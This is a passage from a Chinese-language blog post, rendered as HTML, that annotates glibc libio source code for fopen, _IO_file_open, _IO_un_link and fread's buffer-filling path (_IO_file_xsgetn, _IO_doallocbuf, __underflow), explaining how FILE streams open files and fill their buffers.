class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">	  omode = O_RDWR;</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">	  oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">	  oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* Ignore.  */</span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 _IO_file_open，打开文件</span></span><br><span class="line">  <span class="comment">// _IO_file_open将执行系统调用 open 打开文件</span></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">			  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后根据结果，再执行最后的一些设置，太长了，省略吧。</span></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_fopen, _IO_file_fopen)</span><br></pre></td></tr></table></figure>

<h5 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h5><p>使用系统调用打开文件，并设置_fileno为文件句柄。</p>
<p>代码位于/libio/fileops.c</p>
<p>参数:</p>
<ul>
<li>fp: 文件流指针</li>
<li>filename: 文件名</li>
<li>posix_mode: 打开方式</li>
<li>prot: </li>
<li>read_write: </li>
<li>is32not64: 如其名</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> posix_mode, <span class="keyword">int</span> prot,</span><br><span class="line">	       <span class="keyword">int</span> read_write, <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="comment">// 根据 _flags 来执行系统调用 open 打开文件</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">			     posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>) <span class="comment">// 打开文件失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc; <span class="comment">// 根据open的返回值设置_fileno</span></span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">	&#123;</span><br><span class="line">	  close_not_cancel (fdesc);</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 最后再次使用 _IO_link_in 确保链入。</span></span><br><span class="line">  _IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_open)</span><br></pre></td></tr></table></figure>
<h4 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_un_link (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 先检查 _IO_LINKED</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="comment">// 检查 _IO_list_all，为空则说明该文件流出问题了</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">	;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all) <span class="comment">// 链表中第一个节点，直接修改_IO_list_all即可</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">	  ++_IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="comment">// 链表中部的节点，则需要遍历链表，找出对应文件流然后修改</span></span><br><span class="line">	<span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">	  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">	    &#123;</span><br><span class="line">	      *f = fp-&gt;file._chain;</span><br><span class="line">	      ++_IO_list_all_stamp;</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="comment">// 修改 _flags</span></span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure>

<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread函数的代码位于/libio/iofread.c中，真正的函数名是_IO_fread。</p>
<p>函数的调用顺序: _IO_fread-&gt;_IO_sgetn-&gt;_IO_file_xsgetn(<code>JUMP2 __xsgetn</code>也就是通过vtable中的函数调用)，主要内容在_IO_file_xsgetn中。</p>
<h3 id="IO-file-xsgetn"><a href="#IO-file-xsgetn" class="headerlink" title="_IO_file_xsgetn"></a>_IO_file_xsgetn</h3><p>从文件流中读取数据，并放入read缓冲区中。</p>
<p>_IO_file_xsgetn 函数的定义位于/libio/fileops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="keyword">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断 _IO_buf_base &amp; _IO_save_base 是否为空。</span></span><br><span class="line">  <span class="comment">// *暂时不知道这save缓冲区是干嘛的*</span></span><br><span class="line">  <span class="comment">// 若 _IO_buf_base 为空，则说明缓冲区未建立，调用 _IO_doallocbuf；</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="comment">// 若 _IO_save_base 不为空，则说明 _IO_save_base指向的缓冲区仍</span></span><br><span class="line">      <span class="comment">// 在使用，应该释放掉该缓冲区。</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 接着进入循环，来进行缓冲区的拷贝：进行一些长度检测，</span></span><br><span class="line">  <span class="comment">// 然后从文件流中读入数据，读出后将 _IO_read_ptr += n</span></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have) <span class="comment">// 缓冲区中数据足够</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	      fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	      want = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="comment">// 缓冲区中数据不足</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">// 只读取已有长度</span></span><br><span class="line">	      <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	          <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	          s += have;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	          want -= have;</span><br><span class="line">	          fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	      <span class="comment">// 检查是否有备份*暂时未知作用*</span></span><br><span class="line">	      <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	        &#123;</span><br><span class="line">	          _IO_switch_to_main_get_area (fp);</span><br><span class="line">	          <span class="keyword">continue</span>;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* </span></span><br><span class="line"><span class="comment">	         缓冲区不能满足需求时，若buf缓冲区存在且want的长度小于缓冲区长度，</span></span><br><span class="line"><span class="comment">	         则调用__underflow读取数据，调用__underflow的结果若为EOF，则表明</span></span><br><span class="line"><span class="comment">	         无输入了，将退出读入。若不满足判断条件，则直接使用_IO_SYSREAD(调用__read)读</span></span><br><span class="line"><span class="comment">	         取用户输入。</span></span><br><span class="line"><span class="comment">	      */</span></span><br><span class="line">	      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	          &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	        &#123;</span><br><span class="line">	          <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	          <span class="keyword">continue</span>;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">	  <span class="comment">// 设置缓冲区，令_IO_read_xx与_IO_write_xx都指向buf缓冲区</span></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); <span class="comment">//set read_buf</span></span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); <span class="comment">// set write_buf</span></span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  <span class="comment">// 调用_IO_SYSREAD读取</span></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure>

<h4 id="IO-doallocbuf"><a href="#IO-doallocbuf" class="headerlink" title="_IO_doallocbuf"></a>_IO_doallocbuf</h4><p>_IO_doallocbuf 的作用是初始化缓冲区。</p>
<p>_IO_doallocbuf 位于 glibc/libio/genops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检测buf缓冲区是否存在，存在则退出</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 检测 _IO_UNBUFFERED 和 _mods 两个标志位，然后使用 _IO_DOALLOCATE 宏，</span></span><br><span class="line">    <span class="comment">// 相当于调用了 vtable 中的 _IO_file_doallocate。</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// _IO_setb 就是重新申请缓冲区(当 IO_buf_base 存在)或设置 IO_buf_base</span></span><br><span class="line">    <span class="comment">// 为指定位置，这个位置存储在 _shortbuf 中。</span></span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br><span class="line"><span class="comment">//#define _IO_DOALLOCATE(FP) JUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure>

<h5 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h5><p>过程大致为：</p>
<ul>
<li>通过调用 __stat函数(vtable中)，获取文件信息，获取到 size(st.st_blksize)</li>
<li>根据 size 申请一块内存</li>
<li>接着调用了 _IO_setb设置缓冲区</li>
</ul>
<p>代码位于 /libio/filedoalloc.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_file_doallocate (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="comment">// 调用_IO_SYSSTAT获取FILE信息(st 结构体)</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">	      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      local_isatty (fp-&gt;_fileno))</span><br><span class="line">	    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">	size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size); <span class="comment">// 根据size申请内存</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>); <span class="comment">// 设置buf缓冲区指针</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure>

<h4 id="underflow"><a href="#underflow" class="headerlink" title="__underflow"></a>__underflow</h4><p>当前会使用到的仅有其中对缓冲区内容的判断，然后会调用_IO_UNDERFLOW</p>
<p>__underflow 位于 /glibc/libio/genops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  ……</span><br><span class="line">  <span class="comment">// 检查缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ……</span><br><span class="line">  <span class="comment">// 一切正常则会调用_IO_UNDERFLOW，即vtable中的_IO_file_underflow</span></span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure>

<h5 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h5><p>实际的函数名为_IO_new_file_underflow，作用是往缓冲区读入数据</p>
<p>位于/libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查标志_IO_NO_READS，存在则退出</span></span><br><span class="line">  <span class="comment">// _IO_NO_READS表示不可read数据</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 再检查缓冲区中是否有的内容，有则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 若缓冲区未初始化，调用_IO_doallocbuf</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="comment">// 检查_IO_LINE_BUF和_IO_UNBUFFERED标志(暂时未知)</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">     This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  <span class="comment">// 重新设置缓冲区指针</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 然后调用_IO_SYSREAD读取数据</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span 